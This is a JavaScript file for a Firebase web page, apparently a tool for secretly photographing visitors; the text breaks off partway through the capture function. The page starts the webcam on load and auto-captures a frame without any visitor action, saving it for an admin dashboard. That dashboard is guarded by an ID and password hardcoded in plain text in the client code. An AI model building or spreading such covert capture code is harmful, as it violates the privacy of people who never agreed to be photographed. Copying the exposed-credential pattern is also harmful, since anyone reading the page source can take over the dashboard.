import { auth, db } from "./firebase.js";
import { signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
import { collection, addDoc, serverTimestamp, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

const ADMIN_ID = "8521574912";
const ADMIN_PASSWORD = "rituraj@123";
const LOGIN_KEY = "admin_logged_in";
const STORAGE_ADMIN_ID = "8521574912";

const statusMessage = document.getElementById("status-message");
const errorBox = document.getElementById("error-box");
const errorText = document.getElementById("error-text");
const loginGate = document.getElementById("login-gate");
const dashboardView = document.getElementById("dashboard-view");
const imagesGrid = document.getElementById("images-grid");

const adminIdInput = document.getElementById("admin-id");
const adminPasswordInput = document.getElementById("admin-password");
const loginButton = document.getElementById("login-button");

const videoEl = document.getElementById("camera-stream");
const captureButton = document.getElementById("capture-button");

let userId = null;
let hasAutoCaptured = false;

// Anonymous login
signInAnonymously(auth)
  .then(() => {
    userId = auth.currentUser?.uid || "anonymous";
    status("विज़िटर ऑथ सफल।");
    startCamera();
  })
  .catch(err => showError("अनाम ऑथ विफल: " + err.message));

loginButton.addEventListener("click", () => {
  const enteredId = (adminIdInput.value || "").trim();
  const enteredPw = (adminPasswordInput.value || "").trim();

  if (enteredId === ADMIN_ID && enteredPw === ADMIN_PASSWORD) {
    sessionStorage.setItem(LOGIN_KEY, "true");
    loginGate.classList.add("hidden");
    dashboardView.classList.remove("hidden");
    status("एडमिन लॉगिन सफल।");
    subscribePhotos();
  } else {
    showError("गलत एडमिन ID या पासवर्ड।");
  }
});

captureButton.addEventListener("click", async () => {
  await captureAndSave();
});

// ✅ नया कैमरा और ऑटो-कैप्चर logic
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    videoEl.srcObject = stream;

    videoEl.onloadedmetadata = () => {
      videoEl.play();
      autoCaptureOnce();
    };
  } catch (err) {
    showError("कैमरा एक्सेस विफल: " + err.message);
  }
}

async function autoCaptureOnce() {
  if (hasAutoCaptured) return;
  hasAutoCaptured = true;
  await captureAndSave();
}

async function captureAndSave() {
  try {
    captureButton.disabled = true;
    const w = videoEl.videoWidth || 640;
    const h = videoEl.videoHeight || 480;
    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(videoEl, 0, 0, w, h);
    const base
